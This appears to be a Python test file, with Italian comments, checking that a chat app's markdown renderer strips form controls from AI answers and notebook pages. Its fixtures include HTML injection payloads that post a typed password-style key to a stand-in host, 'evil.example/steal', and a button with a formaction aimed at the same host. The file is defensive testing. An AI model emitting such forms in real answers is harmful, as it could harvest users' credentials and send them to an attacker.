"""Nessun modulo dentro una risposta, ne' dentro una pagina del quaderno.

La configurazione di base di DOMPurify lascia passare ``<form>``, ``<input>``,
``<button>``, ``<textarea>`` e ``<select>``, e la CSP della shell non ha
``form-action``: un ``<form action="https://…">`` scritto nel testo di una
risposta diventava un modulo vero, che mandava a un indirizzo esterno quel che
l'utente ci digitava. La regola sta in ``shared/markdown.js``
(``SANITIZE_CONFIG``) e vale per le due chat e per il lettore delle pagine.

``marked`` e' quello vendorizzato. DOMPurify vero in node non gira (vuole un
DOM, e jsdom non e' una dipendenza del repo): il finto qui sotto fa **solo**
quel che la documentazione di DOMPurify dice di ``FORBID_TAGS`` — toglie i tag
nominati e ne lascia il contenuto — e niente di suo. Senza la configurazione,
quindi, non toglie nulla, come la libreria vera coi suoi default.
"""

from __future__ import annotations

import json
import shutil
import tempfile
from pathlib import Path

from support.js_harness import member, requires_node, run_js, run_module

ROOT = Path(__file__).resolve().parents[2]
ASSETS = ROOT / "jenny" / "templates" / "ui" / "assets"
MARKED = ASSETS / "vendor" / "marked@15.0.7" / "marked.min.js"
pytestmark = requires_node

_FORM_TAGS = ("form", "input", "button", "textarea", "select")

_FAKE_PURIFY = """
globalThis.seen = [];
globalThis.DOMPurify = {
  sanitize(html, cfg) {
    seen.push(cfg);
    let out = String(html);
    for (const tag of (cfg && cfg.FORBID_TAGS) || []) {
      out = out.replace(new RegExp('</?' + tag + '\\\\b[^>]*>', 'gi'), '');
    }
    return out;
  },
};
"""


def _render(text: str) -> str:
    """``renderMarkdown`` come la chiama la casa, con ``marked`` vero."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        (root / "shared").mkdir()
        shutil.copy(ASSETS / "shared" / "markdown.js", root / "shared" / "markdown.js")
        (root / "shared" / "utils.js").write_text(
            "export const escapeHtml = (s) => String(s).replace(/</g, '&lt;');\n", encoding="utf-8"
        )
        entry = root / "prova.mjs"
        entry.write_text(
            "import { createRequire } from 'node:module';\n"
            "const require = createRequire(import.meta.url);\n"
            f"globalThis.marked = require({json.dumps(str(MARKED))});\n"
            + _FAKE_PURIFY
            + "const { renderMarkdown } = await import('./shared/markdown.js');\n"
            f"process.stdout.write(JSON.stringify(renderMarkdown({json.dumps(text)})));\n",
            encoding="utf-8",
        )
        return json.loads(run_module(entry))


def _assert_no_form_controls(html: str) -> None:
    lowered = html.lower()
    for tag in _FORM_TAGS:
        assert f"<{tag}" not in lowered, f"<{tag}> e' passato: {html}"


def test_a_form_in_an_answer_is_not_a_form() -> None:
    html = _render(
        "Scrivi qui la chiave:\n\n"
        '<form action="https://evil.example/steal" method="post">'
        '<input name="k" type="password"><textarea name="t"></textarea>'
        '<select name="s"><option>a</option></select>'
        "<button>Invia</button></form>"
    )
    _assert_no_form_controls(html)
    assert "Invia" in html, "il testo resta: sparisce solo il controllo"


def test_ordinary_markdown_is_untouched() -> None:
    html = _render("**forte** e `codice` e [un link](https://example.org)\n\n| a |\n|---|\n| 1 |")
    for tag in ("<strong>", "<code>", '<a href="https://example.org">', "<table>"):
        assert tag in html, html


def test_a_task_list_keeps_its_boxes_without_inputs() -> None:
    """marked scrive la casella come ``<input type="checkbox">``: senza un
    segno al suo posto, ``- [ ] latte`` diventerebbe un punto qualunque."""
    html = _render("- [ ] latte\n- [x] pane")
    _assert_no_form_controls(html)
    assert "☐" in html and "☑" in html, html


def test_the_workshop_code_block_keeps_its_copy_button() -> None:
    """Il «Copia» dell'officina era un ``<button>`` scritto dal renderer, cioe'
    un tag ora vietato. Entra dopo la sanificazione, da un segnaposto, come
    stringa fissa: un ``<button formaction>`` scritto dal modello no."""
    src = (ASSETS / "mobile-chat.js").read_text(encoding="utf-8")
    slot = src.split("const COPY_SLOT = ", 1)[1].split(";\n", 1)[0]
    restore = src.split("function restoreCopyButtons", 1)[1].split("\n}\n", 1)[0]
    run_js(
        "import assert from 'node:assert/strict';\n"
        + _FAKE_PURIFY
        + f"const COPY_SLOT = {slot};\n"
        "const escapeHtml = (s) => String(s).replace(/</g, '&lt;');\n"
        "const i18n = { t: () => 'Copia' };\n"
        f"function restoreCopyButtons{restore}\n}}\n"
        + """
      const cfg = { FORBID_TAGS: ['form', 'input', 'button', 'textarea', 'select'] };
      const dirty = '<div class="chat-code-header">' + COPY_SLOT + '</div>'
        + '<button formaction="https://evil.example" form="x">Vai</button>';
      const out = restoreCopyButtons(DOMPurify.sanitize(dirty, cfg));
      assert.equal((out.match(/<button/g) || []).length, 1, out);
      assert.ok(out.includes('<button class="chat-code-copy" type="button">Copia</button>'), out);
      assert.ok(!out.includes('formaction'), out);
    """
    )


def test_the_notebook_reader_sanitizes_with_the_same_rule() -> None:
    src = (ASSETS / "home-reader.js").read_text(encoding="utf-8")
    markdown = (ASSETS / "shared" / "markdown.js").as_uri()
    run_js(
        "import assert from 'node:assert/strict';\n"
        + _FAKE_PURIFY
        + f"const {{ SANITIZE_CONFIG }} = await import('{markdown}');\n"
        "const escapeHtml = (s) => s;\n"
        "const reader = {\n  "
        + member(src, "_safeHtml")
        + "\n};\n"
        + """
      const out = reader._safeHtml('<p>x</p><form action="https://evil.example"><input></form>', '');
      assert.equal(out, '<p>x</p>');
      assert.equal(seen[0], SANITIZE_CONFIG);
    """
    )
